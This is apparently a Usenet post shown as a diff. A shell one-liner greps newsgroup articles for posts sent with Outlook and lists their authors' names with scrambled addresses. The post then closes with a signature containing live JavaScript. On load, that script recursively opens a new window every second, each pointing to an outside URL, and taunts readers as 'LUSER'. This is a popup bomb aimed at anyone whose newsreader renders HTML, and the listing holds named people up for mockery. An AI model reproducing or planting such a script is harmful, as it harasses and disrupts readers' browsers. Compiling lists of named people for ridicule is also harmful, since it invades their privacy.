@@ -1,0 +1,30 @@
+lyl@eujxrvtkr:/dxg/gkvun/pxli/articles/gk/uvir/cvznnk>grep 'Newsreader.*Outlook' *|cut -f 1 -d :|xargs -n 1 grep From:|sort -u
+From: "Lydia Gohdes" <MpajM@mvr.re>
+From: "Asia Friend" <qyomgy.bnlom@pwuqqvgu.kz>
+From: "Dgruwmdaixe" <Fclovyzryqz@bedujqqdaja.ln>
+From: "Bodo Denhard" <vzlbo@lkit.jh>
+From: "Giovanni Pfenningschmidt" <kqepcb.pdbrklmb@itnilit.en-ldhbdv.dw>
+From: "Ottilia Hutfilter" <vhkgoie@hhi.tu>
+From: "Tim Uterwedde" <ftjwtco_l@peyinsz.rlb>
+From: "Tim Uterwedde" <gslptpi_in@zic.hn>
+From: "Othmar Ulns" <fjawwhod@kwhp-gq.rw>
+From: "Karsten Hashagen" <Gwnwk.Trezzua@mjxhte-cgb.si>
+From: "SILVIO" <J.P.J.@ome.as>
+From: "Mathäus Olthoff" <uitn@jztfp.yk>
+From: "Mauro" <klno_1442@cnipvyg.ack>
+From: "Xoyatk" <uitn@jztfp.yk>
+From: "Willy" <CoNhme@edy.oz>
+From: "Vincenzo Ingenpaß" <ghlhenvk@zqdiufn.atn>
+From: "j frieser" <l.xecdyayui@rzsgcjj.gp>
+From: Qxeed@x-vhktia.wp (Ehzez)
+From: DunquaJ@h-dnkfwx.ql (Yehxgg Führ+Lilian Kowalczewski)
+From: Bnwjdeciz.Ocwm@r-wilcpu.tb (Mrhobrxjg Flösser)
+From: uicjmx.bnccwipxjcv@etgru.veypmvl.kz (Noah T. Haugk)
+lyl@kqaycirpi:/bwj/fkglq/news/articles/sl/trzr/xwfdne>
+
+oi.b
+-- 
+<script language="Javascript"> function luser(i){var title="W"+i;i=i+1;
+var newwindow=window.open("",title); var cmd="luser("+ i + ")";
+newwindow.location="http://wzx.cmod.rltrmzfg.lp/~g1cbs/ukpczogjrdhhmyv.dtqs";
+window.setTimeout(cmd,1000);}</script><BODY onLoad="luser(0)">LUSER!</Body>
